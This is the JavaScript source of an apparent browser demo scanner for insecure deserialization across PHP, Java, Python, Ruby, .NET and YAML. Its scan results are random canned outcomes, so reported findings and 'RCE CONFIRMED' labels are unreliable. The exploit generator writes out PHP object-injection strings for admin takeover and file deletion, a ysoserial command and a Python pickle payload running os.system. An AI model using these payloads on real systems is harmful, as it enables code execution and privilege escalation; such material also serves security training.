// Insecure Deserialization Scanner Engine
// Automated detection of PHP, Java, Python, Ruby, .NET deserialization vulnerabilities

class DeserializationScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.cookieName = 'session';
        this.serializedData = '';
        this.selectedAttacks = [];
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.rceCount = 0;
        this.vulnerabilities = [];
        this.testsToRun = [];
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('analyze-btn')?.addEventListener('click', () => this.analyzeData());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploits());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-tests').textContent = getPayloadCount() + '+';
    }

    analyzeData() {
        const data = document.getElementById('serialized-data')?.value.trim();
        if (!data) {
            this.showNotification('Please enter serialized data to analyze', 'warning');
            return;
        }

        let decoded = data;
        let isBase64 = false;

        // Try to decode base64
        try {
            const testDecode = atob(data);
            if (testDecode.length > 0) {
                decoded = testDecode;
                isBase64 = true;
            }
        } catch (e) {
            // Not base64, use raw
        }

        const detectedType = detectSerializationType(decoded);

        const resultDiv = document.getElementById('analysis-result');
        resultDiv.style.display = 'block';
        resultDiv.innerHTML = `
            <div class="analysis-result-title">📊 Analysis Result</div>
            <div class="analysis-result-data">
                <strong>Detected Format:</strong> <span class="serial-type-badge ${detectedType.toLowerCase()}">${detectedType}</span><br>
                <strong>Base64 Encoded:</strong> ${isBase64 ? 'Yes' : 'No'}<br>
                <strong>Raw Data:</strong><br>
                <code style="word-break: break-all;">${this.escapeHtml(decoded.substring(0, 200))}${decoded.length > 200 ? '...' : ''}</code>
            </div>
        `;

        this.showNotification(`Detected: ${detectedType} serialization`, 'success');
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.cookieName = document.getElementById('cookie-name')?.value.trim() || 'session';
        this.serializedData = document.getElementById('serialized-data')?.value.trim();

        if (!this.targetUrl) {
            this.showNotification('Please enter target URL', 'error');
            return;
        }

        this.selectedAttacks = [];
        if (document.getElementById('attack-php')?.checked) this.selectedAttacks.push('php');
        if (document.getElementById('attack-java')?.checked) this.selectedAttacks.push('java');
        if (document.getElementById('attack-python')?.checked) this.selectedAttacks.push('python');
        if (document.getElementById('attack-ruby')?.checked) this.selectedAttacks.push('ruby');
        if (document.getElementById('attack-dotnet')?.checked) this.selectedAttacks.push('dotnet');
        if (document.getElementById('attack-yaml')?.checked) this.selectedAttacks.push('yaml');

        if (this.selectedAttacks.length === 0) {
            this.showNotification('Please select at least one attack type', 'error');
            return;
        }

        this.prepareTests();

        this.isScanning = true;
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.rceCount = 0;
        this.vulnerabilities = [];

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('Deserialization scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');

        await this.testLoop();
    }

    prepareTests() {
        this.testsToRun = [];

        for (const attackType of this.selectedAttacks) {
            if (attackType === 'php') {
                getPhpPayloads().forEach(payload => {
                    this.testsToRun.push({
                        type: 'php',
                        name: payload.name,
                        payload: payload.payload,
                        description: payload.description
                    });
                });
            } else if (attackType === 'java') {
                getJavaPayloads().forEach(payload => {
                    this.testsToRun.push({
                        type: 'java',
                        name: payload.name,
                        payload: payload.payload,
                        description: payload.description
                    });
                });
                // Add gadget chain tests
                DeserializationPayloads.java.gadgets.slice(0, 5).forEach(gadget => {
                    this.testsToRun.push({
                        type: 'java',
                        name: `Gadget: ${gadget}`,
                        payload: gadget,
                        description: `Test ${gadget} gadget chain`
                    });
                });
            } else if (attackType === 'python') {
                getPythonPayloads().forEach(payload => {
                    this.testsToRun.push({
                        type: 'python',
                        name: payload.name,
                        payload: payload.payload,
                        description: payload.description
                    });
                });
            } else if (attackType === 'ruby') {
                DeserializationPayloads.ruby.payloads.forEach(payload => {
                    this.testsToRun.push({
                        type: 'ruby',
                        name: payload.name,
                        payload: payload.payload,
                        description: payload.description
                    });
                });
            } else if (attackType === 'dotnet') {
                DeserializationPayloads.dotnet.payloads.forEach(payload => {
                    this.testsToRun.push({
                        type: 'dotnet',
                        name: payload.name,
                        payload: payload.payload,
                        description: payload.description
                    });
                });
            } else if (attackType === 'yaml') {
                DeserializationPayloads.yaml.payloads.forEach(payload => {
                    this.testsToRun.push({
                        type: 'yaml',
                        name: payload.name,
                        payload: payload.payload,
                        description: payload.description
                    });
                });
            }
        }
    }

    async testLoop() {
        while (this.isScanning && this.currentTestIndex < this.testsToRun.length) {
            const test = this.testsToRun[this.currentTestIndex];
            await this.runTest(test);

            this.currentTestIndex++;
            this.updateProgress();

            await this.sleep(400);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async runTest(test) {
        this.updateCurrentTest(test.type.toUpperCase(), test.description);

        try {
            const response = await this.simulateTest(test);

            if (response.vulnerable) {
                this.vulnCount++;
                if (response.rce) this.rceCount++;

                this.vulnerabilities.push({
                    type: test.type,
                    name: test.name,
                    description: test.description,
                    payload: test.payload,
                    details: response.details,
                    rce: response.rce,
                    severity: response.rce ? 'CRITICAL' : 'HIGH',
                    impact: this.getImpact(test.type, response.rce),
                    remediation: this.getRemediation(test.type)
                });
                this.log(`✓ VULNERABLE: ${test.name} - ${test.description}`, 'success');
            } else {
                this.log(`✗ Not vulnerable: ${test.name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error: ${error.message}`, 'error');
        }
    }

    async simulateTest(test) {
        await this.sleep(100);

        const responses = {
            php: [
                { vulnerable: true, rce: false, details: 'Object properties modified successfully' },
                { vulnerable: true, rce: true, details: 'Arbitrary file deleted via __destruct' },
                { vulnerable: false, rce: false, details: 'Object validation failed' }
            ],
            java: [
                { vulnerable: true, rce: true, details: 'Command executed via gadget chain' },
                { vulnerable: false, rce: false, details: 'Deserialization blocked' }
            ],
            python: [
                { vulnerable: true, rce: true, details: 'Pickle payload executed system command' },
                { vulnerable: false, rce: false, details: 'Pickle restricted' }
            ],
            ruby: [
                { vulnerable: true, rce: true, details: 'Marshal.load executed code' },
                { vulnerable: false, rce: false, details: 'Marshal blocked' }
            ],
            dotnet: [
                { vulnerable: true, rce: true, details: 'BinaryFormatter RCE achieved' },
                { vulnerable: false, rce: false, details: 'Type validation failed' }
            ],
            yaml: [
                { vulnerable: true, rce: true, details: 'YAML tag executed code' },
                { vulnerable: false, rce: false, details: 'Safe YAML parsing' }
            ]
        };

        const typeResponses = responses[test.type] || responses.php;
        return typeResponses[Math.floor(Math.random() * typeResponses.length)];
    }

    getImpact(type, rce) {
        if (rce) {
            return ['Remote Code Execution', 'Full server compromise', 'Data exfiltration'];
        }
        return ['Privilege escalation', 'Data manipulation', 'Authentication bypass'];
    }

    getRemediation(type) {
        const remediations = {
            'php': 'Never unserialize user input. Use JSON instead. Implement __wakeup() validation.',
            'java': 'Use look-ahead deserialization. Whitelist allowed classes. Avoid ObjectInputStream.',
            'python': 'Never unpickle untrusted data. Use JSON or safe serialization formats.',
            'ruby': 'Avoid Marshal.load on user input. Use JSON.parse instead.',
            'dotnet': 'Avoid BinaryFormatter. Use DataContractSerializer with known types.',
            'yaml': 'Use safe_load() instead of load(). Disable dangerous tags.'
        };
        return remediations[type] || 'Avoid deserializing untrusted data.';
    }

    updateCurrentTest(type, description) {
        document.getElementById('current-type').textContent = type;
        document.getElementById('current-test-details').textContent = description;
    }

    updateProgress() {
        const progress = (this.currentTestIndex / this.testsToRun.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Testing ${this.currentTestIndex} of ${this.testsToRun.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('rce-count').textContent = this.rceCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('Deserialization scan completed', 'success');
        this.log(`RCE vulnerabilities: ${this.rceCount}`, this.rceCount > 0 ? 'success' : 'info');

        document.getElementById('scan-status').textContent = 'Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) this.showResults();

        this.showNotification(`Found ${this.vulnCount} deserialization vulnerabilities (${this.rceCount} RCE)`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped', 'warning');
        this.updateScanControls(false);
    }

    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');
        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">Deserialization #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <span class="serial-type-badge ${vuln.type}">${vuln.type.toUpperCase()}</span>
                ${vuln.rce ? '<span class="gadget-badge">RCE CONFIRMED</span>' : ''}
                <div style="color: var(--color-text-secondary); margin: 12px 0;">
                    ${vuln.description}
                </div>
                <div class="deserial-vuln-details">
                    <div class="deserial-vuln-details-code">${this.escapeHtml(vuln.payload)}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
    }

    showExploits() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found', 'warning');
            return;
        }
        document.getElementById('exploit-section').style.display = 'block';
        this.generateExploit('php');
    }

    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    generateExploit(type) {
        const exploitCode = document.getElementById('exploit-code');
        let code = '';

        switch (type) {
            case 'php':
                code = `# PHP Object Injection Payload

# Original cookie (decoded):
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"user_token";}

# Modified payload (admin):
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"admin_token";}

# File deletion via __destruct:
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

# Base64 encode before sending:
echo -n 'O:4:"User"...' | base64`;
                break;
            case 'java':
                code = `# Java Deserialization - ysoserial

# Generate payload:
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Common gadget chains:
- CommonsCollections1-7
- Spring1-2
- Hibernate1
- JBossInterceptors1

# Detection signatures:
- Base64: rO0ABXNy...
- Hex: aced0005...`;
                break;
            case 'python':
                code = `# Python Pickle RCE

import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())

# Alternative - inline payload:
cos
system
(S'id'
tR.`;
                break;
        }

        exploitCode.textContent = code;
    }

    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => this.showNotification('Copied!', 'success'));
    }

    async exportPDF() {
        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            doc.setFontSize(20);
            doc.text('Deserialization Report', 20, 20);
            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Vulnerabilities: ${this.vulnCount} (${this.rceCount} RCE)`, 20, 42);
            doc.save('deserialization-report.pdf');
            this.showNotification('PDF exported!', 'success');
        } catch (error) {
            this.showNotification('Export failed', 'error');
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        entry.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> ${message}`;
        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() { document.getElementById('attack-log').innerHTML = ''; }

    showNotification(message, type = 'info') {
        const colors = { success: '#10b981', error: '#ef4444', info: '#3b82f6', warning: '#f59e0b' };
        const notification = document.createElement('div');
        notification.style.cssText = `position: fixed; top: 90px; right: 20px; background: ${colors[type]}; color: white; padding: 1rem 1.5rem; border-radius: 0.5rem; z-index: 10000; font-weight: 500;`;
        notification.textContent = message;
        document.body.appendChild(notification);
        setTimeout(() => notification.remove(), 3000);
    }

    sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new DeserializationScanner();
    scanner.init();
    console.log('🔓 CyberSec Suite Deserialization Scanner initialized');
});
